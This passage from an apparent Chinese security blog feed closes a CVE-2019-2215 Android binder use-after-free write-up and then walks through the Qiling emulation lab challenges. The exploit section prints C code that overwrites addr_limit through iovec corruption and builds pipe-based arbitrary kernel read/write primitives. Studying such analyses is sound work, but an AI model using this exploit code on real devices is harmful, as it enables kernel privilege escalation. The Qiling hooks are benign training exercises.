class="class"><span class="keyword">struct</span> <span class="title">task_struct</span>  *<span class="title">task</span>;</span>      <span class="comment">/* main task structure */</span></span><br><span class="line">    <span class="type">int</span>         preempt_count;      <span class="comment">/* 0 =&gt; preemptable, &lt;0 =&gt; bug */</span></span><br><span class="line">    <span class="type">int</span>         cpu;               <span class="comment">/* cpu */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>有一些非常重要的与安全有关的宏引用了addr_limit字段。其中access_ok如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> access_ok(type, addr, size) __range_ok(addr, size)</span></span><br></pre></td></tr></table></figure><p>从__range_ok的注释可得知它基本上等同于(u65)addr + (u65)size  &lt;&#x3D;  current-&gt;addr_limit，在内核态尝试访问用户态提供的指针时，几乎都会使用此宏。它确保所提供的指针确实是一个用户态指针，从而防止在内核态中使用用户态指针传递内核态指针。一旦addr_limit的限制被突破就可以自由地向用户态指针地址传递内核态指针，且access_ok将永远不会失败。</p><p>为了泄漏内核数据，我们将iovec结构体写入文件描述符中，并使用unlink覆写其中的一个结构体，以便read函数能泄漏数据。要覆写内核数据，我们可以采用另一种方法。就是通过使用iovec结构体调用recvmsg函数并以相同的方式对其进行覆写，我们可以使用write函数将写入的数据覆写到相继的iovec结构体上以获得任意写入。recvmsg函数覆盖UAF对象的iovec结构体代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">iovec_array[IOVEC_INDX_FOR_WQ].iov_base = dummy_page; <span class="comment">// mutex</span></span><br><span class="line">iovec_array[IOVEC_INDX_FOR_WQ].iov_len = <span class="number">1</span>; <span class="comment">// linked list next</span></span><br><span class="line">iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">1</span>].iov_base = (<span class="type">void</span> *)<span class="number">0xDEADBEEF</span>; <span class="comment">// linked list prev</span></span><br><span class="line">iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">1</span>].iov_len = <span class="number">0x8</span> + <span class="number">2</span> * <span class="number">0x10</span>; <span class="comment">// iov_len of previous, then this element and next element</span></span><br><span class="line">iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">2</span>].iov_base = (<span class="type">void</span> *)<span class="number">0xBEEFDEAD</span>;</span><br><span class="line">iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">2</span>].iov_len = <span class="number">8</span>;</span><br></pre></td></tr></table></figure><p>unlink使用内核指针覆盖了<code>IOVEC_INDX_FOR_WQ</code>处的iovec.iov_len和<code>IOVEC_INDX_FOR_WQ+1</code><br>处的iovec.iov_base，一旦recvmsg函数被调用，它将通过write函数写入的数据到，这时可以任意数据写入后面经过验证的iovec结构体中，也就是说可以将任何指针传递给下一个iovec.iov_base<br>，从而实现了任意写。查看写入的数据，可以看到它确实与<code>IOVEC_INDX_FOR_WQ</code>处的iov_len<br>以后的数据对齐。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> second_write_chunk[] = &#123;</span><br><span class="line">    <span class="number">1</span>, <span class="comment">/* iov_len */</span></span><br><span class="line">    <span class="number">0xdeadbeef</span>, <span class="comment">/* iov_base (already used) */</span></span><br><span class="line">    <span class="number">0x8</span> + <span class="number">2</span> * <span class="number">0x10</span>, <span class="comment">/* iov_len (already used) */</span></span><br><span class="line">    current_ptr + <span class="number">0x8</span>, <span class="comment">/* next iov_base (addr_limit) */</span></span><br><span class="line">    <span class="number">8</span>, <span class="comment">/* next iov_len (sizeof(addr_limit)) */</span></span><br><span class="line">    <span class="number">0xfffffffffffffffe</span> <span class="comment">/* value to write */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>修改之后的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> OFFSET_OF_ADDR_LIMIT 8</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">event</span> =</span> &#123;.events = EPOLLIN&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iovec_array</span>[<span class="title">IOVEC_ARRAY_SZ</span>];</span></span><br><span class="line"><span class="type">int</span> iovec_corruption_payload_sz;</span><br><span class="line"><span class="type">int</span> sockfd[<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> byteSent;</span><br><span class="line"><span class="type">pid_t</span> pid;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(iovec_array, <span class="number">0</span>, <span class="keyword">sizeof</span>(iovec_array));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &amp;event))</span><br><span class="line">    exitWithError(<span class="string">&quot;EPOLL_CTL_ADD failed: %s&quot;</span>, strerror(errno));</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> iovec_corruption_payload[] = &#123;</span><br><span class="line">        <span class="number">1</span>,                  <span class="comment">// IOVEC_INDX_FOR_WQ -&gt; iov_len</span></span><br><span class="line">        <span class="number">0xdeadbeef</span>,         <span class="comment">// IOVEC_INDX_FOR_WQ + 1 -&gt; iov_base</span></span><br><span class="line">        <span class="number">0x8</span> + (<span class="number">2</span> * <span class="number">0x10</span>),   <span class="comment">// IOVEC_INDX_FOR_WQ + 1 -&gt; iov_len</span></span><br><span class="line">        thread_info + OFFSET_OF_ADDR_LIMIT, <span class="comment">// Arb. Write location! IOVEC_INDEX_FOR_WQ + 2 -&gt; iov_base</span></span><br><span class="line">        <span class="number">8</span>,                  <span class="comment">// Arb. Write size (only need a QWORD)! IOVEC_INDEX_FOR_WQ + 2 -&gt; iov_len</span></span><br><span class="line">        <span class="number">0xfffffffffffffffe</span>, <span class="comment">// Arb. Write value! Smash it so we can write anywhere.</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">iovec_corruption_payload_sz = <span class="keyword">sizeof</span>(iovec_corruption_payload);</span><br><span class="line"></span><br><span class="line">iovec_array[IOVEC_INDX_FOR_WQ].iov_base = dummy_page; <span class="comment">// mutex</span></span><br><span class="line">iovec_array[IOVEC_INDX_FOR_WQ].iov_len  = <span class="number">1</span>; <span class="comment">// only ask for one byte since we&#x27;ll only write one byte - linked list next</span></span><br><span class="line">iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">1</span>].iov_base = (<span class="type">void</span> *)<span class="number">0xDEADBEEF</span>; <span class="comment">// linked list prev</span></span><br><span class="line">iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">1</span>].iov_len  = <span class="number">0x8</span> + <span class="number">2</span> * <span class="number">0x10</span>;     <span class="comment">// length of previous iovec + this one + the next one</span></span><br><span class="line">iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">2</span>].iov_base = (<span class="type">void</span> *)<span class="number">0xBEEFDEAD</span>; <span class="comment">// will get smashed by iovec_corruption_payload</span></span><br><span class="line">iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">2</span>].iov_len  = <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, sockfd))</span><br><span class="line">    exitWithError(<span class="string">&quot;Socket pair failed: %s&quot;</span>, strerror(errno));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Preemptively satisfy the first iovec request</span></span><br><span class="line"><span class="keyword">if</span>(write(sockfd[<span class="number">1</span>], <span class="string">&quot;X&quot;</span>, <span class="number">1</span>) != <span class="number">1</span>)</span><br><span class="line">    exitWithError(<span class="string">&quot;Write 1 byte failed: %s&quot;</span>, strerror(errno));</span><br><span class="line"></span><br><span class="line">pid = fork();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(pid == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    prctl(PR_SET_PDEATHSIG, SIGKILL);</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    epoll_ctl(epfd, EPOLL_CTL_DEL, fd, &amp;event);</span><br><span class="line"></span><br><span class="line">    byteSent = write(sockfd[<span class="number">1</span>], iovec_corruption_payload, iovec_corruption_payload_sz);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(byteSent != iovec_corruption_payload_sz)</span><br><span class="line">        exitWithError(<span class="string">&quot;[CHILD] Write returned %d, expected %d.&quot;</span>, byteSent, iovec_corruption_payload_sz);</span><br><span class="line"></span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ioctl(fd, BINDER_THREAD_EXIT, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msg</span> =</span> &#123;</span><br><span class="line">        .msg_iov = iovec_array,</span><br><span class="line">        .msg_iovlen = IOVEC_ARRAY_SZ</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">recvmsg(sockfd[<span class="number">0</span>], &amp;msg, MSG_WAITALL);</span><br></pre></td></tr></table></figure><p>最后，这一进程地址限制已经被绕过，任意内核读写很简单，只要几个read和write系统调用。通过write将想要写入的数据写到管道，并在管道的另一端read一个内核地址，就可以将数据写入该内核地址。相反，通过write将数据从一个内核地址写入管道，然后在管道的另一端调用read，就可以从该内核地址读取数据。成功实现任意读写。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> kernel_rw_pipe[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(pipe(kernel_rw_pipe))</span><br><span class="line">    exitWithError(<span class="string">&quot;Kernel R/W Pipe failed: %s&quot;</span>, strerror(errno));</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kernel_write</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> kaddr, <span class="type">void</span> *data, <span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(len &gt; <span class="number">0x1000</span>)</span><br><span class="line">        exitWithError(<span class="string">&quot;Reads/writes over the size of a page results causes issues.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(write(kernel_rw_pipe[<span class="number">1</span>], data, len) != len)</span><br><span class="line">        exitWithError(<span class="string">&quot;Failed to write data to kernel (write)!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(read(kernel_rw_pipe[<span class="number">0</span>], (<span class="type">void</span> *)kaddr, len) != len)</span><br><span class="line">        exitWithError(<span class="string">&quot;Failed to write data to kernel (read)!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kernel_read</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> kaddr, <span class="type">void</span> *data, <span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(len &gt; <span class="number">0x1000</span>)</span><br><span class="line">        exitWithError(<span class="string">&quot;Reads/writes over the size of a page results causes issues.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(write(kernel_rw_pipe[<span class="number">1</span>], (<span class="type">void</span> *)kaddr, len) != len)</span><br><span class="line">        exitWithError(<span class="string">&quot;Failed to read data from kernel (write)!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(read(kernel_rw_pipe[<span class="number">0</span>], data, len) != len)</span><br><span class="line">        exitWithError(<span class="string">&quot;Failed to read data from kernel (read)!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h2><p>binder驱动程序具有清理例程，可以通过ioctl函数在实际关闭驱动程序之前触发该例程。这是个binder IPC子系统中的Use after Free漏洞，binder_thread-&gt;waitqueue成员链表中链接了epoll data结构，但当调用了BINDER_THREAD_EXIT对应的方法，就会导致binder_thread被释放，当程序结束的时候，epoll相应的结构重复遍历到此成员，造成UAF。</p><p>参考链接：</p><p><a href="https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2019/CVE-2019-2215.html">https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2019/CVE-2019-2215.html</a></p><p><a href="https://hernan.de/blog/tailoring-cve-2019-2215-to-achieve-root/">https://hernan.de/blog/tailoring-cve-2019-2215-to-achieve-root/</a></p><p><a href="https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html">https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Qiling framwork lab</title>
      <link href="/2023/06/29/Qiling-framwork-lab/"/>
      <url>/2023/06/29/Qiling-framwork-lab/</url>
      
        <content type="html"><![CDATA[<h1 id="challenge1-操作内存"><a href="#challenge1-操作内存" class="headerlink" title="challenge1:操作内存"></a>challenge1:操作内存</h1><img src="/2023/06/29/Qiling-framwork-lab/Untitled.png" class title="Untitled"><p>可以看到程序需要读取内存地址0x1337的未映射全局变量，需要我们让内存0x1337上存放一个值为1337</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> qiling <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge1</span>(<span class="params">q1</span>):</span><br><span class="line">    q1.mem.<span class="built_in">map</span>(<span class="number">0x1000</span>, <span class="number">0x1000</span>, info = <span class="string">&#x27;[challenge1]&#x27;</span>)</span><br><span class="line">    <span class="comment">#q1.mem.map(addr, size) 注意要4k对齐</span></span><br><span class="line">    q1.mem.write(<span class="number">0x1337</span>,q1.pack16(<span class="number">1337</span>)) <span class="comment"># pack16(value) == struct.pack(&#x27;H&#x27;, value)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    path = [<span class="string">&#x27;qilinglab-aarch64&#x27;</span>]</span><br><span class="line">    rootfs = <span class="string">&quot;./qiling/examples/rootfs/arm64_linux&quot;</span> <span class="comment">#需要对应架构模拟的文件系统</span></span><br><span class="line">    q1 = Qiling(path,rootfs)</span><br><span class="line">    challenge1(q1)</span><br><span class="line">    q1.verbose = <span class="number">0</span> <span class="comment">#方便看输出</span></span><br><span class="line"><span class="comment">#q1.mem.show_mapinfo()</span></span><br><span class="line">    q1.run()</span><br></pre></td></tr></table></figure><img src="/2023/06/29/Qiling-framwork-lab/Untitled1.png" class title="Untitled"><h1 id="Chanllenge2-Syscall-return-hijack"><a href="#Chanllenge2-Syscall-return-hijack" class="headerlink" title="Chanllenge2:Syscall return hijack"></a>Chanllenge2:Syscall return hijack</h1><img src="/2023/06/29/Qiling-framwork-lab/Untitled2.png" class title="Untitled"><p>需要我们在返回之前hook uname系统调用，并修改uname的sysname变量为QilingOS、version变量为ChallengeStart才能过检查。</p><p>uname的结构体如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">utsname</span> &#123;</span><br><span class="line">    <span class="type">char</span> sysname[<span class="number">65</span>];</span><br><span class="line">    <span class="type">char</span> nodename[<span class="number">65</span>];</span><br><span class="line">    <span class="type">char</span> release[<span class="number">65</span>];   </span><br><span class="line">    <span class="type">char</span> version[<span class="number">65</span>];</span><br><span class="line">    <span class="type">char</span> machine[<span class="number">65</span>];</span><br><span class="line">    <span class="type">char</span> domainname[<span class="number">65</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//uname系统调用，接收一个buf，返回由buf指向的结构中的系统信息。</span></span><br><span class="line">        <span class="number">00100</span>d28 e0 <span class="number">03</span> <span class="number">01</span> <span class="number">91</span>     add        check,sp,#<span class="number">0x40</span></span><br><span class="line">        <span class="number">00100</span>d2c a1 ff ff <span class="number">97</span>     bl         &lt;EXTERNAL&gt;::<span class="function">uname                                <span class="type">int</span> <span class="title">uname</span><span class="params">(utsname * __name)</span></span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> qiling.const <span class="keyword">import</span> QL_INTERCEPT</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_uname_on_exit_hook</span>(<span class="params">q1, *args</span>):</span><br><span class="line">    <span class="comment">#uname结构体存放在栈偏移0x40位置</span></span><br><span class="line">    out_struct_addr = q1.arch.regs.sp + <span class="number">0x40</span></span><br><span class="line">    sysname_addr = out_struct_addr</span><br><span class="line">    q1.mem.write(sysname_addr, <span class="string">b&#x27;QilingOS\x00&#x27;</span>)</span><br><span class="line">    version_addr = out_struct_addr + <span class="number">65</span>*<span class="number">3</span></span><br><span class="line">    q1.mem.write(version_addr, <span class="string">b&#x27;ChallengeStart\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge2</span>(<span class="params">q1</span>):</span><br><span class="line">    <span class="comment"># QL_INTERCEPT.EXIT 可以在系统调用之后触发hook</span></span><br><span class="line">    q1.os.set_syscall(<span class="string">&quot;uname&quot;</span>,my_uname_on_exit_hook,QL_INTERCEPT.EXIT)</span><br></pre></td></tr></table></figure><h1 id="Challenge3-FS-amp-Syscall-hijack"><a href="#Challenge3-FS-amp-Syscall-hijack" class="headerlink" title="Challenge3:FS &amp; Syscall hijack"></a>Challenge3:FS &amp; Syscall hijack</h1><img src="/2023/06/29/Qiling-framwork-lab/Untitled3.png" class title="Untitled"><p>分别从&#x2F;dev&#x2F;urandom和getrandom提取0x20字节，必须满足提取的字节相同且从与从&#x2F;dev&#x2F;urandom读取的那一个字节都不相同。</p><ul><li>使用set_syscall可以劫持getrandom系统调用返回<code>00</code>字节</li><li>使用add_fs_mapper和Q1FsMappedObject参数定义一个&#x2F;dev&#x2F;urandom的自定义行为，使其返回<code>00</code>字节</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> qiling.os.mapper <span class="keyword">import</span> QlFsMappedObject</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Fake_urandom</span>(<span class="title class_ inherited__">QlFsMappedObject</span>):</span><br><span class="line">    <span class="comment"># 覆盖/dev/urandom</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">self,size</span>):</span><br><span class="line">        <span class="keyword">if</span> size == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">b&#x27;\x41&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&quot;\x00&quot;</span>*size</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">close</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getrandom_hook</span>(<span class="params">q1, buf, buflen, flag, *args, **kw</span>):</span><br><span class="line">    q1.mem.write(buf, <span class="string">b&#x27;\x00&#x27;</span>*buflen)</span><br><span class="line">    q1.os.set_syscall_return(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge3</span>(<span class="params">q1</span>):    </span><br><span class="line">    q1.os.set_syscall(<span class="string">&quot;getrandom&quot;</span>, getrandom_hook)</span><br><span class="line">    q1.add_fs_mapper(<span class="string">&quot;/dev/urandom&quot;</span>, Fake_urandom())</span><br></pre></td></tr></table></figure><h1 id="Challenge4-Hook-address-无用循环"><a href="#Challenge4-Hook-address-无用循环" class="headerlink" title="Challenge4: Hook address 无用循环"></a>Challenge4: Hook address 无用循环</h1><img src="/2023/06/29/Qiling-framwork-lab/Untitled4.png" class title="Untitled"><p>需要hook 0x100fe0处的条件比较才能进入for循环，直接把x0寄存器改掉</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">loop_hook</span>(<span class="params">q1</span>):</span><br><span class="line">    q1.arch.regs.x0 = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge4</span>(<span class="params">q1</span>):</span><br><span class="line">    base_addr = q1.mem.get_lib_base(q1.path)</span><br><span class="line">    condition_loop_enter = base_addr + <span class="number">0xfe0</span></span><br><span class="line">    q1.hook_address(loop_hook, condition_loop_enter)</span><br></pre></td></tr></table></figure><h1 id="challenge5-hook外部函数-rand"><a href="#challenge5-hook外部函数-rand" class="headerlink" title="challenge5: hook外部函数 rand"></a>challenge5: hook外部函数 rand</h1><img src="/2023/06/29/Qiling-framwork-lab/Untitled5.png" class title="Untitled"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rand_hook</span>(<span class="params">q1, *args, **kw</span>):</span><br><span class="line">    q1.arch.regs.x0 = <span class="number">0</span> <span class="comment"># 设置rand函数的返回值为0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge5</span>(<span class="params">q1</span>):</span><br><span class="line">    q1.os.set_api(<span class="string">&quot;rand&quot;</span>, rand_hook)</span><br></pre></td></tr></table></figure><h1 id="challenge6-hook-address-突破无限循环"><a href="#challenge6-hook-address-突破无限循环" class="headerlink" title="challenge6: hook address 突破无限循环"></a>challenge6: hook address 突破无限循环</h1><img src="/2023/06/29/Qiling-framwork-lab/Untitled6.png" class title="Untitled"><p>和前面challenge4很像，直接hook比较的之前的结果就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">infinite_loop_hook</span>(<span class="params">q1</span>):</span><br><span class="line">    q1.arch.regs.x0 = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge6</span>(<span class="params">q1</span>):</span><br><span class="line">    base_addr = q1.mem.get_lib_base(q1.path)</span><br><span class="line">    add_addr = base_addr + <span class="number">0x1114</span></span><br><span class="line">    q1.hook_address(infinite_loop_hook , add_addr)</span><br></pre></td></tr></table></figure><h1 id="challenge7-hook外部函数-sleep"><a href="#challenge7-hook外部函数-sleep" class="headerlink" title="challenge7: hook外部函数 sleep"></a>challenge7: hook外部函数 sleep</h1><img src="/2023/06/29/Qiling-framwork-lab/Untitled7.png" class title="Untitled"><p>在sleep函数执行之前把参数改成0</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sleep_hook</span>(<span class="params">q1</span>):</span><br><span class="line">    q1.arch.regs.x0 = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge7</span>(<span class="params">q1</span>):</span><br><span class="line">    q1.os.set_api(<span class="string">&quot;sleep&quot;</span>, sleep_hook, QL_INTERCEPT.ENTER)</span><br></pre></td></tr></table></figure><h1 id="challenge8"><a href="#challenge8" class="headerlink" title="challenge8 :"></a>challenge8 :</h1><img src="/2023/06/29/Qiling-framwork-lab/Untitled8.png" class title="Untitled"><p>需要我们在堆上hook 结构体使得s→check &#x3D; 1，对着汇编窗口c一下d一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>1011d0 e0 <span class="number">17</span> <span class="number">40</span> f9     ldr        pvVar2,[sp, <span class="comment">#0x28] == 提取结构体所在的堆地址</span></span><br><span class="line"><span class="number">00</span>1011d4 e1 0f <span class="number">40</span> f9     ldr        x1,[sp, <span class="comment">#0x18]</span></span><br><span class="line"><span class="number">00</span>1011d8 01 08 <span class="number">00</span> f9     <span class="built_in">str</span>        x1,[pvVar2, <span class="comment">#0x10] == s-&gt;check = x1</span></span><br><span class="line"><span class="number">00</span>1011dc 1f <span class="number">20</span> 03 d5     nop                           == hook here</span><br></pre></td></tr></table></figure><p>方法1:直接读取栈上的堆地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hook_nop</span>(<span class="params">q1</span>):</span><br><span class="line">    heap_struct_addr = q1.unpack64(q1.mem.read(q1.arch.regs.sp + <span class="number">0x28</span>, <span class="number">8</span>))</span><br><span class="line">    heap_struct = q1.mem.read(heap_struct_addr,<span class="number">24</span>) <span class="comment"># 读取randomstruct结构体</span></span><br><span class="line">    some_string_addr, magic_addr, check_addr = struct.unpack(<span class="string">&#x27;QQQ&#x27;</span>,heap_struct)</span><br><span class="line">    q1.mem.write(check_addr, <span class="string">b&quot;\x01&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span 